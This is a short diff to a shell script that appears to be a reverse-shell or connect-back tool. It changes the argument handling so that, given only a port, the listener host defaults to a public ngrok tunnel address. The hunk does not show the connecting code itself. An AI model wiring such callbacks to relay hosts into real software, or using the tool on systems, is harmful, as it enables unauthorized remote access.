@@ -43,10 +43,15 @@ usage() {
     exit 1
 }
 
-[ $# -lt 2 ] && usage
-
-LISTENER_IP="$1"
-LISTENER_PORT="$2"
+if [ $# -eq 1 ]; then
+    LISTENER_IP="0.tcp.ap.ngrok.io"
+    LISTENER_PORT="$1"
+elif [ $# -lt 2 ]; then
+    usage
+else
+    LISTENER_IP="$1"
+    LISTENER_PORT="$2"
+fi
 USE_PTY=false
 
 if [ $# -ge 3 ]; then
